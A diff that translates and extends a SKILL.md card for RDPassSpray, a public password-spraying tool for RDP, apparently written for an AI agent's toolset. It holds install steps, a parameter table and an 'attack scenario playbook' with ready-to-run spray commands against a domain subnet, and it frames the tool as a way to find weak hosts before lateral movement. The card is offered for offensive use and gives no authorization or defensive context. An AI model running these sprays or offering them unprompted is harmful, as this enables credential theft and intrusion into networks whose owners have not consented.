@@ -2,38 +2,39 @@
 name: rdpassspray-rdp-spray
 description: "RDPassSpray: Sprays passwords over domain RDP. Signals: brute force, password spraying, RDP spraying, password dictionary, specified domain."
 zh-signals: "RDPassSpray: 域内 RDP 口令喷洒。信号:暴力破解,口令喷射,RDP 喷洒,密码字典,指定域。"
+when-to-use: "Use RDPassSpray when performing password spraying against RDP endpoints across a domain or IP range, e.g., to find weak credentials on hosts before lateral movement."
 ---
 
 # RDPassSpray
 
-- 攻击大类:C28 云与身份喷洒
-- 上游仓库:https://github.com/xFreed0m/RDPassSpray
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C28 Cloud and Identity Spraying
+- Upstream Repository: https://github.com/xFreed0m/RDPassSpray
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/xFreed0m/RDPassSpray && pip install -r requirements.txt
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python RDPassSpray.py -u users.txt -p 'Pass1' -t 10.0.0.5` | RDP 喷洒 |
-| `-u user -p passwords.txt` | 密码字典 |
-| `-d corp.local` | 指定域 |
-| `-v` | 详细 |
+| `python RDPassSpray.py -u users.txt -p 'Pass1' -t 10.0.0.5` | RDP spraying |
+| `-u user -p passwords.txt` | Password dictionary |
+| `-d corp.local` | Target domain |
+| `-v` | Verbose |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 域内 RDP 口令喷洒
+### In-domain RDP password spraying
 
 ```bash
 python RDPassSpray.py -u users.txt -p 'Summer2024!' -t 10.0.0.0/24
-# 横向移动前先找弱口令主机
+# Find hosts with weak credentials before lateral movement
 ```
 
-## 注意事项
+## Notes
 
-RDP 协议级密码喷洒,目标可为 IP 段,域/工作组皆适用。
+Protocol-level password spraying against RDP; targets can be IP ranges, and it works for both domains and workgroups.
